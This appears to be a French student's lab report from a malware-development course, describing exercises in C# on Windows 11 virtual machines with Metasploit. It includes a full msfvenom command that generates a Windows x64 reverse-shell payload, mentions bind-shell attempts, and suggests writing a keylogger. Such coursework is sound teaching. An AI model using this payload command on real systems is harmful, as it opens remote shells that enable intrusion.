# Malware Initation

## Préparation
- Démarrage de deux machines virtuelles Windows 11
  - IP 48 : Machine programmation
  - IP 49 : Machine cible
- Préparation de Visual Studio pour codage en C#. N'étant pas développeur, j'ai préféré utiliser ce language qui me semble plus généraliste.
- Installation Metasploit

## Exercices 1
- Code inchangé, j'ai passé beaucoup de temps à comprendre le code et à me renseigner sur d'autres applications d'appel API comme un keylogger.
- J'ai d'abord essayé de générer un Payload TCP Bind avec MSFVENOM mais je n'ai jamais réussi à ouvrir le port voulu (8000) pour pouvoir écouter toutes les IP. 
    Erreur 0xc000001d --> Changer payload vers 64 bits
    erreur 0xc0000005 memory allocation?
- Je me suis donc rabattu sur un simple MESSAGEBOX qui a fonctionné. 

## Exercice 1B
- Rien à ajouter, compréhension du code mis à disposition

## Exercices 2: 
- Rien à ajouter, compréhension du code mis à disposition

## Exercices 2B: 
- Rien à ajouter, compréhension du code mis à disposition

## Exercices 3: 
- Préparation d'un payload TCP reverse avec MSCVENOM : ** msfvenom LHOST=10.41.10.48 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp **
- Partage du programme compilé sur la machine cible et exécution après le démarrage de notepad.
- Vérification de la connection sur la machine cible en powershell avec ** Get-NetTCPConnection ** mais le Reverse TCP ne semble pas fonctionner... Je vais continuer à investiguer mais après la date limite de remise des travaux. 

## Exercices 3b
- Rien à ajouter, compréhension du code mis à disposition

## Conclusion:
- Travail trés intéressant qui permet de prendre ses marques avec les API et Windows en général.
- Je pense qu'il serait intéressant de demander un nouveau produit plutôt que de reproduire ce qui a été fait, un keylogger par exemple ?
- La limite du 25 Jan m'a forcé à rendre les travaux et à ne pas aller plus loin dans la découverte des payloads MSFVENOM TCP, je vais profiter de la dernière semaine sans cours pour approfondir cela hors du devoir.
